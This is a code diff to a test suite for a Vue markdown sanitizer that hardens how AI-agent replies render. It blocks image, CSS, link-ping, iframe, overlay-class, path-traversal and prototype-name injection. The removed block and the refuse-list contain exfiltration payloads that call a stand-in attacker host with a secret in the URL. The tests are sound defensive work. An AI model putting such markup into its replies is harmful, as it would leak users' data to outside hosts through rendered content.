@@ -6,6 +6,7 @@
 import { describe, expect, it, vi } from 'vitest'
 import { createApp, h, nextTick } from 'vue'
 import { Markdown } from 'vue-stream-markdown'
+import { AGENT_VECTORS, EVIL, OVERLAY_INJECTED, OVERLAY_VECTORS } from '../markdown/exfil-vectors.fixture'
 import { agentMarkdownProps, isAllowedAgentImage, sanitizeAgentNodes } from './markdown-harden'
 
 vi.spyOn(console, 'warn').mockImplementation(() => {})
@@ -32,31 +33,8 @@ function leaks(el: HTMLElement): string[] {
   return out
 }
 
-const E = 'https://evil.example'
-const VECTORS: Record<string, string> = {
-  'markdown image': `![a](${E}/p.png?d=secret)`,
-  'reference image': `![b][r]\n\n[r]: ${E}/ref.png?d=secret`,
-  'protocol-relative image': `![c](//evil.example/pr.png?d=secret)`,
-  'data: image': '![d](data:image/png;base64,iVBORw0KGgo=)',
-  'raw <img>': `<img src="${E}/html.png?d=secret">`,
-  '<style> url()': `<style>p{background:url(${E}/s.png?d=secret)}</style>\n\ntext`,
-  '<link rel=stylesheet>': `<link rel="stylesheet" href="${E}/x.css?d=secret">`,
-  'inline style=url()': `<div style="background:url(${E}/bg.png?d=secret)">hi</div>`,
-  'span style=url(//)': `<span style="background-image:url(//evil.example/b.png)">hi</span>`,
-  '<video poster>': `<video poster="${E}/poster.png?d=secret"></video>`,
-  '<picture><source srcset>': `<picture><source srcset="${E}/src.png?d=secret"><img src="/api/images/ok/raw"></picture>`,
-  '<a ping>': `<a href="https://ok.example" ping="${E}/ping?d=secret">x</a>`,
-  'MDC attributes on markdown': `**s**{style="background:url(${E}/mdc.png)" ping="${E}/p"}`,
-  'MDC component with style': `::callout{style="background:url(${E}/c.png)"}\nhi\n::`,
-  '<svg><image href>': `<svg><image href="${E}/svg.png"></image></svg>`,
-  '<iframe>': `<iframe src="${E}/frame"></iframe>`,
-  '```html fence (previewer iframe)': '```html\n<img src="' + E + '/fence.png?d=secret">\n```',
-  '```HTML fence, uppercase': '```HTML\n<img src="' + E + '/fence2.png?d=secret">\n```',
-  '```html fence never closed': '```html\n<img src="' + E + '/open.png?d=secret">',
-  '```html fence with a style url': '```html\n<div style="background:url(' + E + '/fs.png)">x</div>\n```',
-  '```svg fence': '```svg\n<svg><image href="' + E + '/svgfence.png"/></svg>\n```',
-  '```mermaid fence': '```mermaid\ngraph TD; A-->B; click A "' + E + '/m"\n```'
-}
+const E = EVIL
+const VECTORS = AGENT_VECTORS
 
 describe('agent markdown hardening — real renderer (C1)', () => {
   it.each(Object.entries(VECTORS))('%s: nothing in the DOM references the attacker host', async (_name, md) => {
@@ -104,17 +82,48 @@ describe('agent markdown hardening — real renderer (C1)', () => {
   })
 })
 
+describe('agent markdown class allowlist (cycle 88 I2)', () => {
+  const overlays = (el: HTMLElement) => [...el.querySelectorAll('*')].flatMap(n => [...n.classList].filter(c => OVERLAY_INJECTED.has(c)).map(c => `${n.tagName.toLowerCase()}.${c}`))
+  it.each(Object.entries(OVERLAY_VECTORS))('%s: no positioning/overlay class from the content survives', async (_name, md) => {
+    // The library's own chrome uses its own classes; only count elements inside the rendered text.
+    const el = await render(md)
+    expect(overlays(el)).toEqual([])
+  })
+  it('NOT vacuous: without the sanitizer plugin, the overlay classes reach the DOM', async () => {
+    const { parserOptions: _p, ...noSanitizer } = agentMarkdownProps
+    const el = await render(OVERLAY_VECTORS['raw <a class> overlay']!, noSanitizer)
+    expect(overlays(el)).not.toEqual([])
+  })
+})
+
 describe('isAllowedAgentImage / sanitizeAgentNodes', () => {
   it.each(['/api/images/x/raw', '/api/images/abc'])('allows %s', s => expect(isAllowedAgentImage(s)).toBe(true))
-  it.each(['https://evil.example/x', '//evil.example/x', '/api/images/../../api/health', '/api/images//evil.example', '/x', 'data:image/png;base64,x', undefined])
+  it.each(['https://evil.example/x', '//evil.example/x', '/api/images/../../api/health', '/api/images/%2e%2e/%2e%2e/api/health', '/api/images/%2F%2Fevil.example', '/api/images//evil.example', '/x', 'data:image/png;base64,x', undefined])
   ('refuses %s', s => expect(isAllowedAgentImage(s)).toBe(false))
   it('drops style/link content, unwraps div, strips non-allowlisted attributes', () => {
     expect(sanitizeAgentNodes([
       ['style', {}, 'p{}'],
       ['div', { style: 'x' }, 'kept'],
-      ['strong', { style: 'background:url(x)', ping: 'y', class: 'ok' }, 'b'],
+      ['strong', { style: 'background:url(x)', ping: 'y', class: 'italic fixed inset-0' }, 'b'],
       ['th', { style: 'text-align:left' }, 'h'],
       ['th', { style: 'text-align:left;background:url(x)' }, 'h2']
-    ])).toEqual(['kept', ['strong', { class: 'ok' }, 'b'], ['th', { style: 'text-align:left' }, 'h'], ['th', {}, 'h2']])
+    ])).toEqual(['kept', ['strong', { class: 'italic' }, 'b'], ['th', { style: 'text-align:left' }, 'h'], ['th', {}, 'h2']])
+  })
+  it('namespaces ids under user-content- and re-points #fragment links (cycle 88 M5)', () => {
+    expect(sanitizeAgentNodes([['h2', { id: 'app' }, 't'], ['a', { href: '#app' }, 'j'], ['a', { href: 'https://x.example/#a' }, 'k']]))
+      .toEqual([['h2', { id: 'user-content-app' }, 't'], ['a', { href: '#user-content-app' }, 'j'], ['a', { href: 'https://x.example/#a' }, 'k']])
+  })
+  it('prototype-named tags/attributes are not allowlisted and never throw (cycle 88 I3)', () => {
+    expect(sanitizeAgentNodes([
+      ['constructor', { prototype: 'x' }, 'hi'],
+      ['__proto__', { keys: 'x' }, 'p'],
+      ['p', { constructor: 'x', toString: 'y', __proto__: 'z', hasOwnProperty: 'w' }, 'k']
+    ])).toEqual(['hi', 'p', ['p', {}, 'k']])
+  })
+  it('a <constructor prototype=x> / <__proto__> reply renders its text instead of crashing', async () => {
+    const el = await render('before <constructor prototype="x">hi</constructor> <__proto__ keys="y">there</__proto__> after')
+    expect(el.textContent).toContain('before')
+    expect(el.textContent).toContain('after')
+    expect(el.querySelector('constructor')).toBeNull()
   })
 })
